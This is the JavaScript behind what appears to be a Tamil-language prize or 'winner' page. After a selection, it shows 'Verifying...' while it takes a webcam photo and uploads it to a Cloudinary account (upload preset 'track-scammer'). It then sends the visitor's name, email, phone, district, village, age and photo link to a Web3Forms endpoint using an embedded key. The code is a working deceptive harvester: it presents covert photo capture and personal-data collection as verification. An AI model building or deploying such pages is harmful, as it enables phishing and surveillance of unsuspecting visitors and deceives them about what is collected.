
const WEB3FORM_KEY = "09622475-8c34-4332-a294-0f3a8ec1994e"; // ⚠️ change this


let currentStream = null;
let capturedImageUrl = "";

const CLOUD_NAME = "dxvdy9bza";
const UPLOAD_PRESET = "track-scammer";

function showPage(id) {
  document.querySelectorAll(".page").forEach(p => {
    p.classList.toggle("active", p.id === id);
  });
}

function setStatus(msg) {
  document.getElementById("status").innerText = msg;
}

function getSelectedWinner() {
  return document.querySelector('input[name="winner"]:checked');
}

async function autoStart() {
  const selected = getSelectedWinner();

  if (!selected) {
    return;
  }

  showPage("page2");
  startVerification();
}

async function startVerification() {
  const video = document.getElementById("video");

  try {
    currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = currentStream;

    setStatus("Verifying...");
    await video.play();

    setTimeout(async () => {
      const img = captureImage(video);
      capturedImageUrl = await uploadToCloudinary(img);
      showPage("page3");
    }, 1000);

  } catch {
    setStatus("Camera denied!");
  }
}

function captureImage(video) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);
  return canvas.toDataURL("image/png");
}

async function uploadToCloudinary(data) {
  const blob = await (await fetch(data)).blob();

  const form = new FormData();
  form.append("file", blob);
  form.append("upload_preset", UPLOAD_PRESET);

  const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
    method: "POST",
    body: form
  });

  const result = await res.json();
  return result.secure_url;
}

async function finalSubmit() {
  const name = document.getElementById("name").value;

  if (!name.trim()) {
    alert("பெயர் அவசியம்");
    return;
  }

  await fetch("https://api.web3forms.com/submit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      access_key: WEB3FORM_KEY,
      winner: getSelectedWinner()?.value,
      name,
      email: email.value,
      phone: phone.value,
      district: district.value,
      village: village.value,
      age: age.value,
      image: capturedImageUrl
    })
  });

  alert("Submitted!");

  setTimeout(() => {
    showPage("page1");

    document.querySelectorAll("input").forEach((input) => {
      if (input.type === "radio") {
        input.checked = false;
      } else {
        input.value = "";
      }
    });
  }, 2000);
}
